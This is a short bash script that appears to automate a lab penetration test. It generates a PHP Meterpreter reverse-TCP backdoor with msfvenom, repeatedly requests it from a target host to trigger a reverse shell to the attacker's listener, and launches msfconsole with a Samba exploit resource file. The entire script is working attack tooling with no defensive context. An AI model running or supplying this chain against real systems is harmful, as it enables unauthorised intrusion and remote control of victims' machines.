#!/bin/bash

msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.100.87 LPORT=4444 > ~/backdoor.php
(
for i in {1..6}
do
  curl http://192.168.100.86/backdoor.php
  sleep 5
done
) &
msfconsole -qr samba.rc

